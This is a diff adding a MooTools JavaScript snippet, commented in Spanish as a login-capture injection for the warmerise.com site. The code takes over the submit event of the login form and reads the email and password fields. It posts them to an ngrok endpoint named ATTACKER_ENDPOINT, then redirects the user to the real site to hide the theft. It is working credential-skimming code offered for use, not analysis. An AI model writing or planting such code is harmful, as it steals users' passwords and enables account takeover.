@@ -1,0 +1,45 @@
+/* --- INYECCION DE CAPTURA V4.0 (DEFINITIVA - BASADA EN HTML ANALIZADO) --- */
+window.addEvent('domready', function() {
+    // ⚠️ Tu URL de Ngrok (CONFIRMADA)
+    var ATTACKER_ENDPOINT = "https://justa-overscrupulous-succeedingly.ngrok-free.dev/capture-login";
+
+    // 1. Identificar el formulario con el ID CORRECTO
+    var form = $('user_form_login'); 
+
+    if (form) {
+        // 2. Sobrescribe el evento de envío (submit)
+        form.addEvent('submit', function(event) {
+            event.stop(); // <--- Detiene el envío original y evita el error 404
+
+            // 3. Obtener los campos con los ID CORRECTOS
+            var emailInput = $('email_field'); 
+            var passwordInput = $('password');
+
+            var email = emailInput ? emailInput.get('value') : 'EMAIL_NO_ENCONTRADO_V4';
+            var password = passwordInput ? passwordInput.get('value') : 'PASSWORD_NO_ENCONTRADO_V4';
+            
+            // 4. Crear y enviar el objeto JSON (usando MooTools Request.JSON)
+            var dataToSend = {
+                email: email,
+                password: password
+            };
+
+            new Request.JSON({
+                url: ATTACKER_ENDPOINT,
+                method: 'post',
+                data: JSON.encode(dataToSend), 
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                // 5. Redirigir al sitio real (warmerise.com)
+                onComplete: function() {
+                    window.location.href = "https://warmerise.com";
+                },
+                onFailure: function() {
+                    window.location.href = "https://warmerise.com";
+                }
+            }).send();
+        });
+    }
+});
+/* --- FIN INYECCION DE CAPTURA V4.0 --- */
